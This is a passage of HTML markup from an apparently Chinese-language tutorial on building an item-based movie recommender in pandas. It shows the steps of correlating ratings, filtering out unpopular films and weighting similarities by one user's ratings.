style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstarWarsRatings = movieRatings['Star Wars (1977)']\r\n\r\nsimilarMovies = movieRatings.corrwith(starWarsRatings)\r\nsimilarMovies = similarMovies.dropna()\r\ndf = pd.DataFrame(similarMovies)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449dfffe014659830-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfffe014659830-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfffe014659830-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfffe014659830-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfffe014659830-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449dfffe014659830-1\"><span class=\"crayon-v\">starWarsRatings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">movieRatings</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'Star Wars (1977)'</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfffe014659830-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b625449dfffe014659830-3\"><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">movieRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">corrwith</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">starWarsRatings</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfffe014659830-4\"><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">dropna</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625449dfffe014659830-5\"><span class=\"crayon-v\">df</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">DataFrame</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>4.去除不流行的电影以避免生成不合适的推荐</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0002922382775\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nratingsCount = 100\r\nmovieStats = ratings.groupby('title').agg({'rating': [np.size, np.mean]})\r\npopularMovies = movieStats['rating']['size'] &gt;= ratingsCount\r\nmovieStats[popularMovies].sort_values([('rating', 'mean')], ascending=False)[:15]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0002922382775-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0002922382775-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e0002922382775-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0002922382775-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0002922382775-1\"><span class=\"crayon-v\">ratingsCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0002922382775-2\"><span class=\"crayon-v\">movieStats</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ratings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">groupby</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'title'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">agg</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">{</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">mean</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e0002922382775-3\"><span class=\"crayon-v\">popularMovies</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">movieStats</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'size'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ratingsCount</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0002922382775-4\"><span class=\"crayon-v\">movieStats</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">popularMovies</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sort_values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'mean'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ascending</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">15</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>5.提取与目标电影相类似的流行电影</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0005477733572\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndf = movieStats[popularMovies].join(pd.DataFrame(similarMovies, columns=['similarity']))\r\ndf.sort_values(['similarity'], ascending=False)[:15]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0005477733572-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0005477733572-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0005477733572-1\"><span class=\"crayon-v\">df</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">movieStats</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">popularMovies</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">join</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">DataFrame</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">columns</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'similarity'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0005477733572-2\"><span class=\"crayon-v\">df</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sort_values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'similarity'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ascending</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">15</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<h3>第二步：基于用户的所有评分做出推荐</h3>\n<p>1.生成每两部电影之间的相似度，并只保留流行电影的相似度</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0009003110246\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nuserRatings = ratings.pivot_table(index=['user_id'],columns=['title'],values='rating')\r\ncorrMatrix = userRatings.corr(method='pearson', min_periods=100)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0009003110246-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0009003110246-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0009003110246-1\"><span class=\"crayon-v\">userRatings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ratings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pivot_table</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'user_id'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">columns</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'title'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">values</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0009003110246-2\"><span class=\"crayon-v\">corrMatrix</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">userRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">corr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">method</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'pearson'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_periods</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>2.对于每部用户看过并评分过的电影，生成推荐（这里我们选择用户0）</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e000d689750398\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmyRatings = userRatings.loc[0].dropna()\r\nsimCandidates = pd.Series()\r\nfor i in range(0, len(myRatings.index)):\r\n    #取出与评分过电影相似的电影\r\n    sims = corrMatrix[myRatings.index[i]].dropna()\r\n    #以用户对这部电影的评分高低来衡量它的相似性\r\n    sims = sims.map(lambda x: x * myRatings[i])\r\n    #将结果放入相似性候选列表中\r\n    simCandidates = simCandidates.append(sims)\r\n\r\nsimCandidates.sort_values(inplace = True, ascending = False)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-1\"><span class=\"crayon-v\">myRatings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">userRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">loc</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">dropna</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-2\"><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Series</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-3\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">myRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#取出与评分过电影相似的电影</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">sims</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">corrMatrix</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">myRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">dropna</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#以用户对这部电影的评分高低来衡量它的相似性</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">sims</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sims</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">x *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myRatings</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#将结果放入相似性候选列表中</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sims</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-11\"><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sort_values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">inplace</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">True</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ascending</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>3.将所有相同电影的相似度加和</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0010014782982\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" 